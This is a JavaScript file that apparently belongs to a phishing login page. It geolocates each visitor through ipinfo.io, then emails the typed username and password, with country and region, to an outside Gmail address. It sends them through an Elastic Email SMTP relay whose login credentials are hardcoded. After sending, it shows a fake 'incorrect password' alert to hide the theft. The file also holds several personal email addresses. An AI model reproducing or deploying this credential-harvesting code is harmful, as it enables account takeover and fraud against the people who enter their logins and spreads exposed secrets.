

document.addEventListener('DOMContentLoaded', function() {
  // Call function to get user's location when the page loads
  getUserLocation();
});

function getUserLocation() {
  // Make an AJAX request to get the user's location using ipinfo.io API
  fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
          // Update the country and region (state) input fields with the retrieved information
          document.getElementById('country').value = data.country;
          document.getElementById('region').value = data.region;
      })
      .catch(error => {
          console.error('Error getting user location:', error);
      });
}



function sendEmail(){
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "naomisharon289@gmail.com",
    Password : "1B20BF5EC02DFA4A51217AE742E542870116",
  To : 'benzzil621@gmail.com',
  From : "naomisharon289@gmail.com",
  Subject : "You just received email details",
  Body : "Name: " + document.getElementById("uname").value
       + "<br>"
        + "<br> password: " + document.getElementById("upass").value
        + "<br>"
        + "<br> Country: " + document.getElementById("country").value
        + "<br>"
        + "<br> state: " + document.getElementById("region").value
        
}).then(
message => alert("The password you entered is incorrect. Please check your password and try again")
);
}


//keshempire08@gmail.com

